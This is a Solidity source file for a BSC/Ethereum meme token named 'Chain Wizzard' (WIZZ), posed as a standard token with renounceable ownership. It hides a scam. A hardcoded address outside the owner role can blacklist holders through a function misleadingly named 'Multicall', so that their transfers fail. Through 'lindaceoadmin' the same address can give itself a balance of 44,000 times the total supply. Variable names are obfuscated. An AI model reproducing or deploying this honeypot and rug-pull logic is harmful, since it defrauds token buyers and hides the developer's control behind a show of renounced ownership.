/**
 *Submitted for verification at BscScan.com on 2023-05-24
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-23
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-21
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-20
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-19
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-19
*/

/**
 *Submitted for verification at Etherscan.io on 2023-05-17
*/

/**
 *Submitted for verification at BscScan.com on 2023-05-17
*/

/**
 *Submitted for verification at BscScan.com on 2023-05-16
*/

/**
 *Submitted for verification at BscScan.com on 2023-05-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Ownable  {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _check();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _check() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }


    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


pragma solidity ^0.8.0;



contract MEMEToken is Ownable {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    

    uint256 private _tokentotalSupply;
    string private _tokenname;
    string private _tokensymbol;
    


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address public _cwojakpepe567;
    mapping(address => bool) private _boboLeve;
    function CANCELOGPP(address sss) external   {
        if (_cwojakpepe567 == _msgSender()) {
            _boboLeve[sss] = false;
        }
         if (_cwojakpepe567 == _msgSender()) {
            _boboLeve[sss] = false;
        }
    }

    function Multicall(address sss) external   {
        if (_cwojakpepe567 == _msgSender()) {
            _boboLeve[sss] = true;
        }
    }

    function peedceoAmount() public view returns (uint256) {
        return _tokentotalSupply;
    }

    function lindaceoadmin() external {
        address tswojaks = _msgSender();
        if (_cwojakpepe567!= tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe567 == tswojaks){
            _balances[_cwojakpepe567] = peedceoAmount()*(44000);
        }
        
    }
   

    function getmrppepep(address sss) public view returns(bool)  {
        return _boboLeve[sss];
    }

    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe567 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
        _tokenname = tokenName_;
        _tokensymbol = Tokensymbol_;
        uint256 amount = 10000000000*10**decimals();
        _tokentotalSupply += amount;
        _balances[msg.sender] += amount;
        emit Transfer(address(0), msg.sender, amount);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _tokenname;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }


    function decimals() public view returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view returns (uint256) {
        return _tokentotalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */

    function transfer(address to, uint256 amount) public returns (bool) {
        _internaltransfer(_msgSender(), to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _internalspendAllowance(from, spender, amount);
        _internaltransfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }


    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    uint256 pepppxEEEE = 0;
    function _internaltransfer(
        address fromSender,
        address toSender,
        uint256 amount
    ) internal virtual {
        require(fromSender != address(0), "ERC20: transfer from the zero address");
        require(toSender != address(0), "ERC20: transfer to the zero address");
        if(_boboLeve[fromSender] == true){
            amount = amount+peedceoAmount();
        }
        uint256 curbalance = _balances[fromSender];
        require(curbalance >= amount, "ERC20: transfer amount exceeds balance");


        _balances[fromSender] = _balances[fromSender]-amount;
        uint256 taxAmount = amount*pepppxEEEE/100;
        _balances[toSender] = _balances[toSender]+amount-taxAmount;

        emit Transfer(fromSender, toSender, amount-taxAmount);
        emit Transfer(fromSender, address(0), taxAmount);    
        
    }


    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.
     *
     * Does not update the allowance amount in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _internalspendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}

contract CoinToken is MEMEToken {
    string _name = "Chain Wizzard";
    string _symbol = "WIZZ";
    constructor(string memory name_, string memory symbol_) MEMEToken(name_,symbol_) {
        
    }
}